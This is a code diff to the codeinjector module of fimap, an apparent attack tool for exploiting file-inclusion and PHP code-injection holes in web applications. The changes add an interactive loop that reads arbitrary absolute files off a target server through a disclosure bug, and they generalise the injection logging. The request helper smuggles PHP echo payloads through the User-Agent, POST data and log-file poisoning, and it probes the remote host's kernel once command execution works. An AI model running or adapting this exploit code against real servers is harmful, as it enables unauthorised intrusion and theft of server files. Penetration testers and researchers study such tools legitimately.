@@ -57,7 +57,7 @@ class codeinjector(baseClass):
 
         hostname = domain.getAttribute("hostname")
         mode = vuln.getAttribute("mode")
-        path = vuln.getAttribute("path")
+        fpath = vuln.getAttribute("path")
         param = vuln.getAttribute("param")
         prefix = vuln.getAttribute("prefix")
         suffix = vuln.getAttribute("suffix")
@@ -68,6 +68,7 @@ class codeinjector(baseClass):
         postdata = vuln.getAttribute("postdata")
         ispost = vuln.getAttribute("ispost") == "1"
         language = vuln.getAttribute("language")
+        print vuln.getAttribute("language")
         
         xml2config = self.config["XML2CONFIG"]
         langClass = xml2config.getAllLangSets()[language]
@@ -75,7 +76,7 @@ class codeinjector(baseClass):
         if (kernel == ""): kernel = None
         payload = "%s%s%s" %(prefix, shcode, suffix)
         if (not ispost):
-            path = path.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+            path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
         else:
             postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
         php_inject_works = False
@@ -87,16 +88,16 @@ class codeinjector(baseClass):
         code = None
 
         if (mode.find("A") != -1 and mode.find("x") != -1):
-            self._log("Testing php-code injection thru User-Agent...", self.LOG_INFO)
+            self._log("Testing %s-code injection thru User-Agent..."%(language), self.LOG_INFO)
 
         elif (mode.find("P") != -1 and mode.find("x") != -1):
-            self._log("Testing php-code injection thru POST...", self.LOG_INFO)
+            self._log("Testing %s-code injection thru POST..."%(language), self.LOG_INFO)
 
         elif (mode.find("L") != -1):
             if (mode.find("H") != -1):
-                self._log("Testing php-code injection thru Logfile HTTP-UA-Injection...", self.LOG_INFO)
+                self._log("Testing %s-code injection thru Logfile HTTP-UA-Injection..."%(language), self.LOG_INFO)
             elif (mode.find("F") != -1):
-                self._log("Testing php-code injection thru Logfile FTP-Username-Injection...", self.LOG_INFO)
+                self._log("Testing %s-code injection thru Logfile FTP-Username-Injection..."%(language), self.LOG_INFO)
 
         elif (mode.find("R") != -1):
             if settings["dynamic_rfi"]["mode"] == "ftp":
@@ -122,12 +123,12 @@ class codeinjector(baseClass):
 
         code = self.__doHaxRequest(url, postdata, mode, php_test_code, suffix)
         if code == None:
-            self._log("php-code testing failed! code=None", self.LOG_ERROR)
+            self._log("%s-code testing failed! code=None"%(language), self.LOG_ERROR)
             sys.exit(1)
 
 
         if (code.find(php_test_result) != -1):
-            self._log("PHP Injection works! Testing if execution works...", self.LOG_ALWAYS)
+            self._log("%s Injection works! Testing if execution works..."%(language), self.LOG_ALWAYS)
             php_inject_works = True
             shellquiz, shellanswer = xml2config.generateShellQuiz()
             shell_test_code = shellquiz
@@ -158,7 +159,7 @@ class codeinjector(baseClass):
                         self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
                         if (kernel == None):
                             self._log("Requesting kernel version...", self.LOG_DEBUG)
-                            uname_cmd = item.generatePayload("uname -r -s", True)
+                            uname_cmd = item.generatePayload(xml2config.getKernelCode(), True)
                             kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, suffix).strip()
                             self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
                             domain.setAttribute("kernel", kernel)
@@ -214,16 +215,58 @@ class codeinjector(baseClass):
                         print "Exploiting Failed!"
                         sys.exit(1)
                     print code.strip()
+        elif (code.find(php_test_code) != -1):
+            
+            try:
+                self._log("Injection not possible! It looks like a file disclosure bug.", self.LOG_WARN)
+                self._log("fimap can currently not readout files comfortably.", self.LOG_WARN)
+                go = raw_input("Do you still want to readout files (even without filtering them)? [Y/n] ")
+                if (go == "Y" or go == "y" or go == ""):
+                    while 1==1:
+                        inp = raw_input("Absolute filepath you want to read out: ")
+                        if (inp == "q"):
+                            print "Fix this hole! Bye."
+                            sys.exit(0)
+                        payload = "%s%s%s" %(prefix, inp, suffix)
+                        if (not ispost):
+                            path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+                        else:
+                            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+                        url = "http://%s%s" %(hostname, path)
+                        code = self.__doHaxRequest(url, postdata, mode, "", appendix, False)
+                        print "--- Unfiltered output starts here ---"
+                        print code
+                        print "--- EOF ---"
+                else:
+                    print "Cancelled. If you want to read out files by hand use this URL:"
+                    
+                    if (not ispost):
+                        path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
+                        url = "http://%s%s" %(hostname, path)
+                        print "URL: " + url
+                    else:
+                        postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
+                        url = "http://%s%s" %(hostname, path)
+                        print "URL          : " + url
+                        print "With Postdata: " + postdata
+            except KeyboardInterrupt:
+                raise
+
         else:
-            print "Failed to test php injection. :("
+            print "Failed to test injection. :("
 
 
-    def __doHaxRequest(self, url, postdata, m, payload, appendix=None):
+    def __doHaxRequest(self, url, postdata, m, payload, appendix=None, doFilter=True):
         code = None
         rndStart = self.getRandomStr()
         rndEnd = self.getRandomStr()
-
-        userload = "<? echo \"%s\"; ?> %s <? echo \"%s\"; ?>" %(rndStart, payload, rndEnd)
+        
+        userload = None
+        if doFilter:
+            userload = "<? echo \"%s\"; ?> %s <? echo \"%s\"; ?>" %(rndStart, payload, rndEnd) #TODO: Make language independet.
+        else:
+            pass #userload = "%s%s%s" %(rndStart, payload, rndEnd)
+            
         if (m.find("A") != -1):
             self.setUserAgent(userload)
             code = self.doPostRequest(url, postdata)
@@ -276,8 +319,10 @@ class codeinjector(baseClass):
                 if (postdata != ""):
                     userload = "%s&%s" %(postdata, userload)
                 code = self.doPostRequest(url, userload)
-
-        if (code != None): code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
+        if (code != None): 
+            if doFilter:
+                code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
+                
         return(code)
 
     def testRFI(self):
